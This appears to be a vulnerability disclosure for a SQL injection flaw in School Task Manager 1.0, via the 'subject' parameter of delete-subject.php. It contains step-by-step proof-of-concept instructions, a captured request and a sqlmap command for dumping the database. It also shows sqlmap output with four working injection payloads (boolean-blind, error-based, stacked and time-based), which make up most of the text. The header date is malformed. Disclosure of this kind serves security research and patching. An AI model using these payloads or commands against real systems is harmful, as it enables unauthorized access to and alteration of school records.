# School-Task-Manager-SQL-Injection-2
+ **Exploit Title:** School-Task-Manager-SQL-Injection-2
+ **Date:** 2024-22-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/16877/school-task-manager-using-php-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=16877&title=School+Task+Manager+Using+PHP+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
School Task Manager 1.0 allows SQL Injection via the 'subject' parameter in "/school-task-manager/endpoint/delete-subject.php?subject=6". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "localhost/school-task-manager/index.php"
+ Select any subject and press the delete-subject button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /school-task-manager/endpoint/delete-subject.php?subject=6 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```
+ Use sqlmap to exploit. In sqlmap, use 'subject' parameter to dump the database. 
```
sqlmap -r r.txt -p subject --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
Parameter: subject (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: subject=6' RLIKE (SELECT (CASE WHEN (2936=2936) THEN 6 ELSE 0x28 END))-- rdYA

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: subject=6' AND EXTRACTVALUE(1488,CONCAT(0x5c,0x716b6a6a71,(SELECT (ELT(1488=1488,1))),0x716a6a7671))-- ahTU

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: subject=6';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: subject=6' AND (SELECT 6603 FROM (SELECT(SLEEP(5)))iBWA)-- DMXl
---
[17:57:53] [INFO] testing MySQL
[17:57:53] [INFO] confirming MySQL
[17:57:54] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[17:57:54] [INFO] fetching current database
[17:57:54] [INFO] resumed: 'school_task_manager_db'
current database: 'school_task_manager_db'
```
+ current database: `school_task_manager_db`
![Ekran görüntüsü 2024-01-22 030650](https://github.com/BurakSevben/School-Task-Manager-SQL-Injection-2/assets/117217689/fbdf10ae-37a6-4262-a703-57e62f01649e)
